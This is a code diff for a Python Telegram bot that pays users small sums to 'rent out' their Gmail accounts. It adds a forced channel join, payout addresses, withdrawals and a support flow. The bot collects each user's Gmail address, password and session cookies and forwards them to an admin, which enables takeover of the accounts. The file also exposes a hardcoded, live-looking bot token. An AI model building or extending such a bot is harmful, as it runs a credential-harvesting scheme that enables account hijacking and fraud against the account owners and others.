@@ -16,8 +16,12 @@ from telegram.ext import (
 
 # ================= CONFIGURATION =================
 BOT_TOKEN = "8995026167:AAH0lS5E05eQtm7s4vgYZPhy72Uv6cSdtl8"  # Paste your token from BotFather
-ADMIN_ID =      6112720850         # Paste your numerical Telegram User ID
+ADMIN_ID =     6112720850          # Paste your numerical Telegram User ID
 TUTORIAL_VIDEO_URL = "https://t.me/googlejobhubsudeb/3415" # Your video link
+
+# CHANNEL JOIN FORCE CONFIGURATION
+CHANNEL_USERNAME = "@googlejobhubsudeb" # e.g. @BongTakeAnime (include the @)
+CHANNEL_LINK = "https://t.me/googlejobhubsudeb" # Link to your channel
 # =================================================
 
 # 1. FLASK KEEP-ALIVE SERVER
@@ -40,7 +44,8 @@ def init_db():
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
-            balance REAL DEFAULT 0.0
+            balance REAL DEFAULT 0.0,
+            payment_address TEXT DEFAULT ''
         )
     ''')
     cursor.execute('''
@@ -56,15 +61,51 @@ def init_db():
             last_payout_stage TEXT DEFAULT 'None'
         )
     ''')
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS withdrawals (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            amount REAL,
+            address TEXT,
+            status TEXT DEFAULT 'Pending'
+        )
+    ''')
     conn.commit()
     conn.close()
 
 init_db()
 
-# Conversation states
-GMAIL, PASSWORD, COOKIES = range(3)
+# Helper function to check channel membership
+async def check_channel_joined(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    try:
+        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        if member.status in ['creator', 'administrator', 'member']:
+            return True
+        return False
+    except Exception:
+        return True
 
-# 3. /START COMMAND
+async def send_join_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = (
+        "⚠️ **MUST JOIN CHANNEL TO USE THIS BOT!**\n\n"
+        "Please join our official channel to get updates, payment proofs, and access to all features!"
+    )
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
+        [InlineKeyboardButton("✅ Joined / Verify", callback_data="check_joined")]
+    ])
+    
+    if update.callback_query:
+        await update.callback_query.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")
+    else:
+        await update.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")
+
+# Conversation States
+GMAIL, PASSWORD, COOKIES = range(3)
+WITHDRAW_AMOUNT, SET_ADDRESS = range(3, 5)
+SUPPORT_MSG = 5
+
+# 3. /START COMMAND & CHECK JOINED
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -74,6 +115,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.commit()
     conn.close()
 
+    is_joined = await check_channel_joined(user_id, context)
+    if not is_joined:
+        await send_join_prompt(update, context)
+        return
+
+    await send_welcome_menu(update, context)
+
+async def send_welcome_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         "WELCOME TO OUR RENTAL BOT 😊\n"
         "_________________________\n\n"
@@ -98,14 +147,35 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     main_keyboard = ReplyKeyboardMarkup([
         ["📧 Rent Mail", "💰 Balance"],
         ["📊 Account Earning History"],
-        ["💬 Support", "💳 Withdrawal"]
+        ["⚙️ Payment Address", "💳 Withdrawal"],
+        ["💬 Support"]
     ], resize_keyboard=True)
 
-    await update.message.reply_text(welcome_text, reply_markup=inline_kb)
-    await update.message.reply_text("Choose an option from the menu below:", reply_markup=main_keyboard)
+    if update.callback_query:
+        await update.callback_query.message.reply_text(welcome_text, reply_markup=inline_kb)
+        await update.callback_query.message.reply_text("Choose an option from the menu below:", reply_markup=main_keyboard)
+    else:
+        await update.message.reply_text(welcome_text, reply_markup=inline_kb)
+        await update.message.reply_text("Choose an option from the menu below:", reply_markup=main_keyboard)
 
-# 4. RENT MAIL CONVERSATION FLOW
+async def handle_check_joined(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+
+    if await check_channel_joined(user_id, context):
+        await query.delete_message()
+        await send_welcome_menu(update, context)
+    else:
+        await query.message.reply_text("❌ You haven't joined the channel yet! Please join and click **Verify** again.", parse_mode="Markdown")
+
+# 4. RENT MAIL FLOW
 async def start_rent(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await check_channel_joined(user_id, context):
+        await send_join_prompt(update, context)
+        return ConversationHandler.END
+
     await update.message.reply_text("📥 **Step 1:** Please enter your Gmail address:")
     return GMAIL
 
@@ -136,7 +206,12 @@ async def get_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.commit()
     conn.close()
 
-    await update.message.reply_text("✅ Your Gmail submission is complete! Sent to admin for verification.")
+    # Dynamic Confirmation Message
+    await update.message.reply_text(
+        "✅ **Gmail Submitted Successfully!**\n\n"
+        "Your balance will be updated soon after our admin checks your Gmail.",
+        parse_mode="Markdown"
+    )
 
     admin_msg = (
         f"📩 **NEW GMAIL RENTAL SUBMISSION**\n\n"
@@ -156,54 +231,236 @@ async def get_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_buttons, parse_mode="Markdown")
     return ConversationHandler.END
 
-# 5. ADMIN ACCEPT / REJECT HANDLER
+# 5. PAYMENT ADDRESS & WITHDRAWAL SYSTEM
+async def start_set_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await check_channel_joined(user_id, context):
+        await send_join_prompt(update, context)
+        return ConversationHandler.END
+
+    await update.message.reply_text(
+        "⚙️ **Set Payment Address:**\n\nPlease enter your **UPI ID** or **USDT Wallet Address** (e.g. `yourname@upi` or `TRX/USDT Address`):",
+        parse_mode="Markdown"
+    )
+    return SET_ADDRESS
+
+async def save_payment_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    address = update.message.text.strip()
+    user_id = update.effective_user.id
+
+    conn = sqlite3.connect("rental_bot.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET payment_address = ? WHERE user_id = ?", (address, user_id))
+    conn.commit()
+    conn.close()
+
+    await update.message.reply_text(f"✅ **Payment Address Saved!**\n\nSaved Address: `{address}`", parse_mode="Markdown")
+    return ConversationHandler.END
+
+async def start_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await check_channel_joined(user_id, context):
+        await send_join_prompt(update, context)
+        return ConversationHandler.END
+
+    conn = sqlite3.connect("rental_bot.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT balance, payment_address FROM users WHERE user_id = ?", (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    bal = row[0] if row else 0.0
+    address = row[1] if row else ""
+
+    if not address:
+        await update.message.reply_text(
+            "⚠️ **No Payment Address Set!**\n\nPlease click on **⚙️ Payment Address** from the main menu to save your UPI or USDT address first."
+        )
+        return ConversationHandler.END
+
+    if bal < 30:
+        await update.message.reply_text(f"❌ **Withdrawal Failed**\n\nYour balance is ₹{bal:.2f}. Minimum balance required is **₹30**.", parse_mode="Markdown")
+        return ConversationHandler.END
+
+    context.user_data['user_balance'] = bal
+    context.user_data['user_address'] = address
+
+    await update.message.reply_text(
+        f"💳 **Your Current Balance:** ₹{bal:.2f}\n"
+        f"📍 **Payout Address:** `{address}`\n\n"
+        f"Enter the amount you want to withdraw (Minimum **₹30**):",
+        parse_mode="Markdown"
+    )
+    return WITHDRAW_AMOUNT
+
+async def process_withdrawal_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    address = context.user_data.get('user_address')
+    bal = context.user_data.get('user_balance', 0.0)
+
+    try:
+        amount = float(update.message.text.strip())
+    except ValueError:
+        await update.message.reply_text("❌ Please enter a valid numerical amount!")
+        return WITHDRAW_AMOUNT
+
+    if amount < 30:
+        await update.message.reply_text("❌ **Amount too low!** Minimum withdrawal is ₹30.")
+        return WITHDRAW_AMOUNT
+
+    if amount > bal:
+        await update.message.reply_text(f"❌ **Insufficient Balance!** Your current balance is ₹{bal:.2f}.")
+        return WITHDRAW_AMOUNT
+
+    conn = sqlite3.connect("rental_bot.db")
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO withdrawals (user_id, amount, address) VALUES (?, ?, ?)",
+        (user_id, amount, address)
+    )
+    wd_id = cursor.lastrowid
+    conn.commit()
+    conn.close()
+
+    await update.message.reply_text("✅ **Withdrawal Request Submitted!**\n\nOur admin will review and send payment to your saved address.")
+
+    admin_msg = (
+        f"💸 **NEW WITHDRAWAL REQUEST**\n\n"
+        f"👤 **User ID:** `{user_id}`\n"
+        f"💵 **Requested Amount:** ₹{amount:.2f}\n"
+        f"📍 **Saved Address:** `{address}`"
+    )
+
+    admin_buttons = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("✅ Approve & Pay", callback_data=f"wdaccept_{wd_id}"),
+            InlineKeyboardButton("❌ Reject", callback_data=f"wdreject_{wd_id}")
+        ]
+    ])
+
+    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_buttons, parse_mode="Markdown")
+    return ConversationHandler.END
+
+# 6. SUPPORT SYSTEM
+async def start_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await check_channel_joined(user_id, context):
+        await send_join_prompt(update, context)
+        return ConversationHandler.END
+
+    await update.message.reply_text("💬 **Customer Support:**\n\nPlease type your query/question below and send it. Our admin will receive it directly!")
+    return SUPPORT_MSG
+
+async def handle_support_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_msg = update.message.text
+    user = update.effective_user
+    
+    # Send confirmation to user
+    await update.message.reply_text("✅ **Thanks for messaging us!** Our admin will respond soon.")
+
+    # Forward support ticket to admin
+    admin_ticket = (
+        f"📩 **NEW SUPPORT TICKET**\n\n"
+        f"👤 **From User:** {user.mention_markdown_v2()} (`{user.id}`)\n"
+        f"💬 **Message:**\n{user_msg}\n\n"
+        f"👉 *Reply to user via:* `/msg {user.id} Your response here`"
+    )
+    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_ticket, parse_mode="Markdown")
+    return ConversationHandler.END
+
+# 7. ADMIN ACCEPT / REJECT HANDLER
 async def handle_admin_decision(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data.split("_")
     action = data[0]
-    rental_id = data[1]
+    record_id = data[1]
 
     conn = sqlite3.connect("rental_bot.db")
     cursor = conn.cursor()
-    cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (rental_id,))
-    record = cursor.fetchone()
 
-    if not record:
-        await query.edit_message_text("❌ Rental record not found.")
-        conn.close()
-        return
+    if action in ["accept", "reject"]:
+        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (record_id,))
+        record = cursor.fetchone()
 
-    target_user_id, gmail = record
+        if not record:
+            await query.edit_message_text("❌ Record not found.")
+            conn.close()
+            return
 
-    if action == "accept":
-        now = datetime.now()
-        cursor.execute("UPDATE gmail_rentals SET status = 'Accepted', accepted_at = ? WHERE id = ?", (now, rental_id))
-        conn.commit()
+        target_user_id, gmail = record
 
-        await context.bot.send_message(
-            chat_id=target_user_id,
-            text=f"🎉 **Gmail Accepted!**\n\nYour Gmail (`{gmail}`) has been successfully rented out. Your earning starts soon!",
-            parse_mode="Markdown"
-        )
-        await query.edit_message_text(f"✅ Approved Gmail `{gmail}` for user `{target_user_id}`.")
+        if action == "accept":
+            now = datetime.now()
+            cursor.execute("UPDATE gmail_rentals SET status = 'Accepted', accepted_at = ? WHERE id = ?", (now, record_id))
+            conn.commit()
 
-    elif action == "reject":
-        cursor.execute("UPDATE gmail_rentals SET status = 'Rejected' WHERE id = ?", (rental_id,))
-        conn.commit()
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=f"🎉 **Gmail Accepted!**\n\nYour Gmail (`{gmail}`) has been successfully rented out. Your earning starts soon!",
+                parse_mode="Markdown"
+            )
+            await query.edit_message_text(f"✅ Approved Gmail `{gmail}` for user `{target_user_id}`.")
 
-        await context.bot.send_message(
-            chat_id=target_user_id,
-            text=f"❌ **Gmail Submission Rejected**\n\nYour submission for `{gmail}` was rejected.",
-            parse_mode="Markdown"
-        )
-        await query.edit_message_text(f"❌ Rejected Gmail `{gmail}`.")
+        elif action == "reject":
+            cursor.execute("UPDATE gmail_rentals SET status = 'Rejected' WHERE id = ?", (record_id,))
+            conn.commit()
+
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=f"❌ **Gmail Submission Rejected**\n\nYour submission for `{gmail}` was rejected.",
+                parse_mode="Markdown"
+            )
+            await query.edit_message_text(f"❌ Rejected Gmail `{gmail}`.")
+
+    elif action in ["wdaccept", "wdreject"]:
+        cursor.execute("SELECT user_id, amount, address FROM withdrawals WHERE id = ?", (record_id,))
+        record = cursor.fetchone()
+
+        if not record:
+            await query.edit_message_text("❌ Withdrawal record not found.")
+            conn.close()
+            return
+
+        target_user_id, amount, address = record
+
+        if action == "wdaccept":
+            cursor.execute("UPDATE users SET balance = MAX(0, balance - ?) WHERE user_id = ?", (amount, target_user_id))
+            cursor.execute("UPDATE withdrawals SET status = 'Approved' WHERE id = ?", (record_id,))
+            conn.commit()
+
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=(
+                    f"🎉 **WITHDRAWAL SUCCESSFUL!**\n\n"
+                    f"💰 **Amount:** ₹{amount:.2f}\n"
+                    f"📍 **Address/UPI:** `{address}`\n\n"
+                    f"✅ **Your balance has been credited!** Thank you for using our bot."
+                ),
+                parse_mode="Markdown"
+            )
+            await query.edit_message_text(f"✅ Approved & paid ₹{amount:.2f} to user `{target_user_id}`.")
+
+        elif action == "wdreject":
+            cursor.execute("UPDATE withdrawals SET status = 'Rejected' WHERE id = ?", (record_id,))
+            conn.commit()
+
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=f"❌ **WITHDRAWAL REJECTED**\n\nYour withdrawal request for ₹{amount:.2f} was rejected by admin.",
+                parse_mode="Markdown"
+            )
+            await query.edit_message_text(f"❌ Rejected withdrawal for user `{target_user_id}`.")
 
     conn.close()
 
-# 6. ACCOUNT EARNING HISTORY (FIXED & EXPANDED)
+# 8. ACCOUNT EARNING HISTORY
 async def earning_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    if not await check_channel_joined(user_id, context):
+        await send_join_prompt(update, context)
+        return
+
     conn = sqlite3.connect("rental_bot.db")
     cursor = conn.cursor()
     cursor.execute("SELECT gmail, status, total_earned, accepted_at, last_payout_stage FROM gmail_rentals WHERE user_id = ?", (user_id,))
@@ -241,7 +498,6 @@ async def earning_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     
                 now = datetime.now()
 
-                # Block 1: 1h Stage
                 if stage == "None":
                     target_time = accepted_dt + timedelta(hours=1)
                     rem = target_time - now
@@ -251,7 +507,6 @@ async def earning_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     else:
                         history_text += "⏱ **1st Block (1h Bonus):** Ready for Payout! 💰\n"
 
-                # Block 2: 6h Stage
                 elif stage == "1h":
                     target_time = accepted_dt + timedelta(hours=6)
                     rem = target_time - now
@@ -261,7 +516,6 @@ async def earning_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     else:
                         history_text += "⏱ **2nd Block (6h Payout):** Pending Cookie Update 🔔\n"
 
-                # Block 3: 12h Stage
                 else:
                     target_time = accepted_dt + timedelta(hours=12)
                     rem = target_time - now
@@ -275,36 +529,44 @@ async def earning_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(history_text, parse_mode="Markdown")
 
-# 7. BALANCE & OTHER BUTTONS
+# 9. BALANCE
 async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    if not await check_channel_joined(user_id, context):
+        await send_join_prompt(update, context)
+        return
+
     conn = sqlite3.connect("rental_bot.db")
     cursor = conn.cursor()
-    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
+    cursor.execute("SELECT balance, payment_address FROM users WHERE user_id = ?", (user_id,))
     row = cursor.fetchone()
     conn.close()
 
     bal = row[0] if row else 0.0
-    await update.message.reply_text(f"💰 **Your Current Balance:** ₹{bal:.2f}")
+    addr = row[1] if row and row[1] else "Not Set"
+    await update.message.reply_text(f"💰 **Your Current Balance:** ₹{bal:.2f}\n📍 **Saved Payment Address:** `{addr}`", parse_mode="Markdown")
 
-async def show_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("💬 **Support:** Contact admin directly for assistance.")
+# 10. ADMIN COMMANDS (DIRECT MSG, BROADCAST, BALANCE)
+async def direct_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    try:
+        target_id = int(context.args[0])
+        msg = " ".join(context.args[1:])
 
-async def show_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    conn = sqlite3.connect("rental_bot.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
-    row = cursor.fetchone()
-    conn.close()
+        if not msg:
+            await update.message.reply_text("⚠️ Usage: `/msg <user_id> <your message>`")
+            return
 
-    bal = row[0] if row else 0.0
-    if bal < 30:
-        await update.message.reply_text(f"❌ **Withdrawal Failed**\n\nYour balance is ₹{bal:.2f}. Minimum balance required is ₹30.")
-    else:
-        await update.message.reply_text("✅ Withdrawal request submitted to admin!")
+        await context.bot.send_message(
+            chat_id=target_id,
+            text=f"📩 **ADMIN MESSAGE:**\n\n{msg}",
+            parse_mode="Markdown"
+        )
+        await update.message.reply_text(f"✅ Message sent successfully to user `{target_id}`.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to send message. Reason: {e}")
 
-# 8. ADMIN COMMANDS
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -373,7 +635,7 @@ async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         conn = sqlite3.connect("rental_bot.db")
         cursor = conn.cursor()
-        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (target_id,))
+        cursor.execute("SELECT balance, payment_address FROM users WHERE user_id = ?", (target_id,))
         u = cursor.fetchone()
         cursor.execute("SELECT gmail, status, total_earned FROM gmail_rentals WHERE user_id = ?", (target_id,))
         rentals = cursor.fetchall()
@@ -383,7 +645,7 @@ async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ User not found.")
             return
 
-        text = f"👤 **USER INFO:** `{target_id}`\n💰 **Balance:** ₹{u[0]:.2f}\n\n📧 **Mails:**\n"
+        text = f"👤 **USER INFO:** `{target_id}`\n💰 **Balance:** ₹{u[0]:.2f}\n📍 **Address:** `{u[1]}`\n\n📧 **Mails:**\n"
         for r in rentals:
             text += f"• `{r[0]}` | Status: `{r[1]}` | Earned: ₹{r[2]}\n"
 
@@ -391,7 +653,7 @@ async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.message.reply_text("⚠️ Usage: `/userinfo <user_id>`")
 
-# 9. MAIN APP RUNNER
+# 11. MAIN APP RUNNER
 if __name__ == '__main__':
     app = Application.builder().token(BOT_TOKEN).build()
 
@@ -405,17 +667,44 @@ if __name__ == '__main__':
         fallbacks=[]
     )
 
+    address_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex('.*Payment Address.*'), start_set_address)],
+        states={
+            SET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_payment_address)],
+        },
+        fallbacks=[]
+    )
+
+    withdraw_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex('.*Withdrawal.*'), start_withdrawal)],
+        states={
+            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal_amount)],
+        },
+        fallbacks=[]
+    )
+
+    support_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex('.*Support.*'), start_support)],
+        states={
+            SUPPORT_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_support_msg)],
+        },
+        fallbacks=[]
+    )
+
     app.add_handler(CommandHandler("start", start))
     app.add_handler(rent_conv)
-    app.add_handler(CallbackQueryHandler(handle_admin_decision, pattern="^(accept|reject)_"))
+    app.add_handler(address_conv)
+    app.add_handler(withdraw_conv)
+    app.add_handler(support_conv)
+
+    app.add_handler(CallbackQueryHandler(handle_check_joined, pattern="^check_joined$"))
+    app.add_handler(CallbackQueryHandler(handle_admin_decision, pattern="^(accept|reject|wdaccept|wdreject)_"))
     
-    # Flexible Regex Filter to catch Account Earning History button regardless of emoji variation
     app.add_handler(MessageHandler(filters.Regex('.*Account Earning History.*'), earning_history))
     app.add_handler(MessageHandler(filters.Regex('.*Balance.*'), show_balance))
-    app.add_handler(MessageHandler(filters.Regex('.*Support.*'), show_support))
-    app.add_handler(MessageHandler(filters.Regex('.*Withdrawal.*'), show_withdrawal))
 
     # Admin Handlers
+    app.add_handler(CommandHandler("msg", direct_message))
     app.add_handler(CommandHandler("broadcast", broadcast))
     app.add_handler(CommandHandler("addbalance", add_balance))
     app.add_handler(CommandHandler("removebalance", remove_balance))
@@ -423,3 +712,5 @@ if __name__ == '__main__':
 
     print("Rental Bot starting...")
     app.run_polling()
+
+        
